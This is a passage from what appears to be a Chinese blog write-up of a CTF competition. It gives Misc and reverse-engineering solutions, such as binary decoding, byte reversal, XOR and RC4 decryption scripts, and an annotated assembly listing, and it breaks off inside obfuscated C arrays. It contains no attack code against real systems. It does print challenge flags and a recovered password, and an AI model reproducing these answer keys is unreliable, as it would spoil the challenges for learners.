class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 给定的二进制数据<br>binary_data = &quot;&quot;&quot;<br>01010011010110010100001101111011<br>01000001011011100011000001110100<br>01101000001100110111001001011111<br>01000001011011010100000001111010<br>00110001011011100011100101011111<br>01010001010100100101111101000011<br>01101111001101000110010101111101<br>&quot;&quot;&quot;<br><br># 将所有二进制数据合并为一个字符串<br>binary_data = binary_data.replace(&quot; &quot;, &quot;&quot;).replace(&quot;\n&quot;, &quot;&quot;)<br><br># 将每 8 位转换为一个字符<br>text = &quot;&quot;<br>for i in range(0, len(binary_data), 8):<br>    byte = binary_data[i:i+8]<br>    char = chr(int(byte, 2))  # 将 8 位二进制转换为整数，再转换为字符<br>    text += char<br><br># 输出结果<br>print(&quot;转换后的字符是：&quot;)<br>print(text)<br></code></pre></td></tr></table></figure><p><img src="/./img/YEfpTToMQZ5k9tAh/1731741830974-a2ed3a0b-efcc-4f98-96c7-b746ff80d49e-679065.png" alt="1731741830974-a2ed3a0b-efcc-4f98-96c7-b746ff80d49e.png"></p><h2 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a>舔狗的觉醒</h2><p><img src="/./img/YEfpTToMQZ5k9tAh/1731745954082-a9b410fe-e3ac-444e-ab35-5ef25dd87b9e-056095.png" alt="1731745954082-a9b410fe-e3ac-444e-ab35-5ef25dd87b9e.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731746574954-c4777790-f644-42af-8a24-9eb52e6c0765-553657.png" alt="1731746574954-c4777790-f644-42af-8a24-9eb52e6c0765.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 打开并读取原始文件内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\1.txt&#x27;, &#x27;rb&#x27;) as f:<br>    a = f.read()<br><br># 去掉原始数据中的换行符、空格等不可见字符<br>a = a.replace(b&#x27;\n&#x27;, b&#x27;&#x27;).replace(b&#x27;\r&#x27;, b&#x27;&#x27;).replace(b&#x27; &#x27;, b&#x27;&#x27;)<br><br># 将内容逆序<br>a = a[::-1]<br><br># 将逆序内容写入新的文件<br>with open(r&#x27;D:\wangzhanxiazai\exppy\new.txt&#x27;, &#x27;wb&#x27;) as new:<br>    new.write(a)<br><br># 读取逆序后的文件内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\new.txt&#x27;, &#x27;rb&#x27;) as f:<br>    b = f.read()<br><br># 将内容转换为可变的字节数组<br>blist = bytearray(b)<br><br># 按两个字节为一组进行交换<br>for i in range(0, len(blist) - 1, 2):<br>    blist[i], blist[i + 1] = blist[i + 1], blist[i]<br><br># 打开目标文件以写入最终内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\flag.txt&#x27;, &#x27;wb&#x27;) as flag:<br>    # 将所有处理后的字节内容连续写入文件<br>    flag.write(blist)<br><br># 打印最终处理的内容（以逆序显示）<br>print(blist)<br>def format_hex_data_from_file(input_file, output_file):<br>    # 读取文件内容<br>    with open(input_file, &#x27;r&#x27;) as file:<br>        hex_data = file.read().strip()<br><br>    # 将字符串分成每两个字符一组<br>    grouped_data = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]<br><br>    # 以16组为一行，每组之间用空格隔开<br>    formatted_data = &#x27;\n&#x27;.join([&#x27; &#x27;.join(grouped_data[i:i + 16]) for i in range(0, len(grouped_data), 16)])<br><br>    # 将格式化后的数据写入输出文件<br>    with open(output_file, &#x27;w&#x27;) as file:<br>        file.write(formatted_data)<br><br><br># 输入和输出文件路径<br>input_file = r&#x27;D:\wangzhanxiazai\exppy\flag.txt&#x27;<br>output_file = r&#x27;D:\wangzhanxiazai\exppy\newflag.txt&#x27;<br><br># 格式化并写入输出文件<br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">f = open(&#x27;D:/wangzhanxiazai/exppy/flag.txt&#x27;,&#x27;rb&#x27;)<br>a = f.read()<br>a = a[::-1]<br>new = open(&#x27;D:/wangzhanxiazai/exppy/flag2.txt&#x27;,&#x27;wb&#x27;)<br>new.write(a)<br>print(a[::-1])<br></code></pre></td></tr></table></figure><p><img src="/./img/YEfpTToMQZ5k9tAh/1731746632701-1ec78e9c-865d-4c00-8312-255c1d33b35c-797876.png" alt="1731746632701-1ec78e9c-865d-4c00-8312-255c1d33b35c.png"></p><p>解压得到加密pdf然后在线解密</p><p><a href="https://smallpdf.com/cn/unlock-pdf#r=result&t=cb132a3b714307af0f6f8ebfe985580a&i=unlock">https://smallpdf.com/cn/unlock-pdf#r=result&amp;t=cb132a3b714307af0f6f8ebfe985580a&amp;i=unlock</a><br><img src="/./img/YEfpTToMQZ5k9tAh/1731749708235-1309a977-70eb-47d5-8d36-e32ac209be66-908926.png" alt="1731749708235-1309a977-70eb-47d5-8d36-e32ac209be66.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731749721087-36b81633-743f-4deb-95df-9f51aead02c6-606673.png" alt="1731749721087-36b81633-743f-4deb-95df-9f51aead02c6.png"></p><h2 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a>ez_pcap_1</h2><p><img src="/./img/YEfpTToMQZ5k9tAh/1731825633685-0cae1a6d-3fab-42c7-b323-45a902ea8e4b-537616.png" alt="1731825633685-0cae1a6d-3fab-42c7-b323-45a902ea8e4b.png"></p><h2 id="乌龟"><a href="#乌龟" class="headerlink" title="乌龟"></a>乌龟</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2024/wav/42988179/1731829418992-636eabee-30e9-4838-9327-339eaf3912eb.wav">sunset.wav</a></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731827198692-23f6d732-4287-4803-afe9-87852056fa8a-640131.png" alt="1731827198692-23f6d732-4287-4803-afe9-87852056fa8a.png"></p><p>得到密码Be4uti7ulSun5e7</p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731828837056-3c43c23d-e2e8-4c46-aada-551d44cc86db-705073.png" alt="1731828837056-3c43c23d-e2e8-4c46-aada-551d44cc86db.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731828972818-0f723f40-2b2c-4b8d-9789-c954806dcfb4-618715.png" alt="1731828972818-0f723f40-2b2c-4b8d-9789-c954806dcfb4.png"></p><p>是logo语言，找个在线网站运行一下</p><p><a href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731829369239-2478770c-2d97-48c4-97c9-447c6d3d8cf9-457541.png" alt="1731829369239-2478770c-2d97-48c4-97c9-447c6d3d8cf9.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731829404007-f48dc251-dc33-47c1-bffd-a9050eb04a7c-010276.png" alt="1731829404007-f48dc251-dc33-47c1-bffd-a9050eb04a7c.png"></p><p>SYC{TU3T1E_P4INTING}</p><p>（当时一直在想E为什么是反过来的，崩不住了，3第一时间想成反方向的E）</p><p>也是跳出固定思维了</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs plain">.file<br>&quot;chal_custom.c&quot;<br>.text<br>.section.rodata<br>.LC0:<br>.string<br>&quot;%s&quot;<br>.LC1:<br>.string<br>&quot;maybe try again!&quot;<br>.LC2:<br>.string<br>&quot;good job!&quot;<br>.data<br>target_data:<br>.string<br>&quot;TTDv^jrZu`Gg6tXfi+pZojpZSjXmbqbmt.&amp;x&quot;<br>.text<br>.globl<br>main<br>.type main,<br><br>@function<br><br><br>main:<br>endbr64<br>pushq % rbp<br>movq % rsp, %rbp<br>subq    $96, %rsp<br>movq % fs: 40, %rax<br>movq % rax, -8( % rbp)<br>xorl % eax, %eax<br>leaq - 80( % rbp), %rax<br>movq % rax, %rsi<br>leaq.LC0( % rip), %rax<br>movq % rax, %rdi<br>movl    $0, %eax<br>call<br>__isoc99_scanf @ PLT<br>movl    $0, -84( % rbp)<br>leaq - 80( % rbp), %rdi<br>jmp.L2<br>.L3:<br>movl - 84( % rbp), %eax<br>movl % eax, %ecx<br>shl % ecx<br>movzbl( % rdi, %rcx), %eax<br>xorb    $7, %al<br>movb % al, (%rdi, %rcx)<br>movzbl<br>1( % rdi, %rcx), %eax<br>subb    $5, %al<br>movb % al, 1( % rdi, %rcx)<br>addl    $1, -84( % rbp)<br><br>.L2:<br>movl - 84( % rbp), %eax<br>imull   $2, %eax<br>cmpl    $36, %eax<br>jl.L3<br><br>leaq<br>target_data( % rip), %rsi<br>leaq - 80( % rbp), %rdi<br>call<br>strcmp @ PLT<br>testl % eax, %eax<br>jne.L4<br><br>leaq.LC2( % rip), %rax<br>jmp.L5<br>.L4:<br>leaq.LC1( % rip), %rax<br>.L5:<br>movq % rax, %rdi<br>call<br>puts @ PLT<br><br>movl    $0, %eax<br>movq - 8( % rbp), %rdx<br>subq % fs: 40, %rdx<br>je.L6<br>call<br>__stack_chk_fail @ PLT<br>.L6:<br>leave<br>ret<br>.size<br>main,.-main<br>.ident<br>&quot;GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0&quot;<br>.section.note.GNU - stack, &quot;&quot;,<br><br><br>@progbits<br><br>.section.note.gnu.property, &quot;a&quot;<br>.align<br>8<br>.long<br>1<br>f - 0<br>f<br>.long<br>4<br>f - 1<br>f<br>.long<br>5<br>0:<br>.string<br>&quot;GNU&quot;<br>1:<br>.align<br>8<br>.long<br>0xc0000002<br>.long<br>3<br>f - 2<br>f<br>2:<br>.long<br>0x3<br>3:<br>.align<br>8<br>4:<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">.L3:<br>    movl    -84(%rbp), %eax          # 加载计数器<br>    movl    %eax, %ecx               # 将计数器复制到 ecx<br>    shl     %ecx                      # 左移 ecx<br>    movzbl  (%rdi,%rcx), %eax        # 获取字符<br>    xorb    $7, %al                  # 对字符异或 7<br>    movb    %al, (%rdi,%rcx)         # 存储结果<br>    movzbl  1(%rdi,%rcx), %eax       # 获取下一个字符<br>    subb    $5, %al                  # 减去 5<br>    movb    %al, 1(%rdi,%rcx)        # 存储结果<br>    addl    $1, -84(%rbp)            # 更新计数器<br>.L2:<br>    movl    -84(%rbp), %eax<br>    imull   $2, %eax                  # 计数器乘以 2<br>    cmpl    $36, %eax                 # 比较计数器是否小于 36<br>    jl      .L3<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=&#x27;TTDv^jrZu`Gg6tXfi+pZojpZSjXmbqbmt.&amp;x&#x27;<br>b=[]<br>for i in range(len(a)):<br>    if(2*i&lt;len(a)):<br>        c=chr(((ord(a[2*i]))^7)%128)<br>    d=chr(ord(a[2*i+1])+5)<br>    if(c!=&#x27;&#x27;):<br>        print(c,end=&#x27;&#x27;)<br>    if(d!=&#x27;&#x27;):<br>        print(d,end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="hellore"><a href="#hellore" class="headerlink" title="hellore"></a>hellore</h2><p><img src="/./img/YEfpTToMQZ5k9tAh/1731465442516-99145fb7-9adc-42c1-ab1a-2b7c318c8ef4-340738.png" alt="1731465442516-99145fb7-9adc-42c1-ab1a-2b7c318c8ef4.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731493752672-94da9418-13e5-4ab8-bbc0-bd97c1737607-402101.png" alt="1731493752672-94da9418-13e5-4ab8-bbc0-bd97c1737607.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = [0x0, 0x1, 0x2, 0x34, 0x3, 0x60, 0x2f, 0x1c, 0x6b, 0x0f, 0x9, 0x18, 0x2d, 0x3e, 0x3c, 0x2, 0x11, 0x7b, 0x27, 0x3a, 0x29, 0x30, 0x60, 0x1a, 0x8, 0x34, 0x3f, 0x64, 0x21, 0x6a, 0x7a, 0x30]<br>a2 = 0x5245564F4C435953<br><br># 将 a2 拆解为字节序列<br>a3 = [(a2 &gt;&gt; (8 * i)) &amp; 0xFF for i in range(8)]  # 提取每个字节<br><br>print(&quot;a3:&quot;, a3)<br><br>for i in range(32):<br>    a[i] = i ^ a[i] ^ a3[i % 8]<br>    print(chr(a[i]), end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="让我康康你的调试"><a href="#让我康康你的调试" class="headerlink" title="让我康康你的调试"></a>让我康康你的调试</h2><p><img src="/./img/YEfpTToMQZ5k9tAh/1731737832708-3fd0eab8-76e5-4de8-acf1-a29d5329b6f0-778696.png" alt="1731737832708-3fd0eab8-76e5-4de8-acf1-a29d5329b6f0.png"></p><p>不理解这个v7的作用是什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import ARC4<br>import binascii<br><br># 十六进制字符串<br>hex_data = &quot;945b7d04c9027aa6390798bc0d68f97e08bdbf9816f804715f1586b69884db61&quot;<br><br># 将十六进制字符串转换为字节<br>ciphertext = binascii.unhexlify(hex_data)<br><br># RC4 密钥（假设你知道密钥）<br>key = b&#x27;syclover&#x27;  # 替换为你的RC4密钥<br><br># 创建 RC4 解密对象<br>cipher = ARC4.new(key)<br><br># 解密数据<br>plaintext = cipher.decrypt(ciphertext)<br><br># 输出解密后的内容<br>print(plaintext.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))<br>for i in range(len(plaintext)):<br>    flag=plaintext[i]^0x14<br>    print(chr(flag),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="也许你也听jay"><a href="#也许你也听jay" class="headerlink" title="也许你也听jay"></a>也许你也听jay</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <br>    <span class="hljs-type">char</span> URL[<span class="hljs-number">46</span>];<br>    <span class="hljs-type">char</span> o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[<span class="hljs-number">46</span>];<br>    <span class="hljs-built_in">strcpy</span>(o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O, URL);<br>    <span class="hljs-type">char</span> o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O00000O0OO0O[] = &#123;<span class="hljs-number">0x96</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xd4</span>&#125;;<br>    <span class="hljs-type">int</span>  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[] = &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8D</span>&#125;;<br>    <span class="hljs-type">int</span>  o00O0OO000OO0oooo0o0oo0O000O0OO0O0O00OO0OO0O00000[] = &#123;<span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span 